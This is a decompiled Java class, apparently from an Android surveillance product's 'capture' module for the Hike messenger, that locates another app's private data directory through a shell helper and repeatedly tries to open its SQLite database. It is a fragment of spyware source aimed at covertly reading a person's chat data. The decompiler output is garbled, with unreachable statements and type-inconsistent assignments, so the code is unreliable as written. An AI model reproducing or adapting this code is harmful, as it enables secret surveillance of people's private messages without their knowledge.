package com.vvt.capture.hike.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.shell.ShellUtil;

public class a
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  
  private static SQLiteDatabase a(int paramInt, String paramString1, String paramString2)
  {
    int i = 0;
    Object localObject1 = null;
    String str;
    Object localObject2;
    Object localObject3;
    int m;
    int n;
    if (0 == 0)
    {
      str = com.vvt.n.a.a(paramString1);
      if (str != null)
      {
        localObject2 = "%s/%s";
        int k = 2;
        localObject3 = new Object[k];
        localObject3[0] = str;
        m = 1;
        localObject3[m] = paramString2;
        str = String.format((String)localObject2, (Object[])localObject3);
        n = b;
        if (n == 0) {}
      }
    }
    for (;;)
    {
      n = ShellUtil.b(str);
      if (n != 0)
      {
        localObject2 = a(str, paramInt);
        i = 5;
        localObject1 = localObject2;
        n = i;
        while ((localObject1 == null) && (n > 0))
        {
          boolean bool = b;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          localObject3 = a(str, paramInt);
          int j = n + -1;
          n = j;
          localObject1 = localObject3;
        }
      }
      return (SQLiteDatabase)localObject1;
      m = 0;
      str = null;
    }
  }
  
  public static SQLiteDatabase a(String paramString)
  {
    int i = 0;
    Object localObject = null;
    int k = 1;
    int m;
    if (paramString == null)
    {
      m = b;
      if (m == 0) {}
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      m = ShellUtil.b(paramString);
      if (m != 0)
      {
        SQLiteDatabase localSQLiteDatabase1 = a(paramString, k);
        i = 5;
        localObject = localSQLiteDatabase1;
        m = i;
        while ((localObject == null) && (m > 0))
        {
          boolean bool = b;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          SQLiteDatabase localSQLiteDatabase2 = a(paramString, k);
          int j = m + -1;
          m = j;
          localObject = localSQLiteDatabase2;
        }
      }
    }
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase a(String paramString1, String paramString2)
  {
    if ((paramString1 == null) || (paramString2 == null))
    {
      boolean bool = b;
      if (bool) {}
      bool = false;
    }
    int i;
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = a(i, paramString1, paramString2))
    {
      return localSQLiteDatabase;
      i = 17;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hike/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */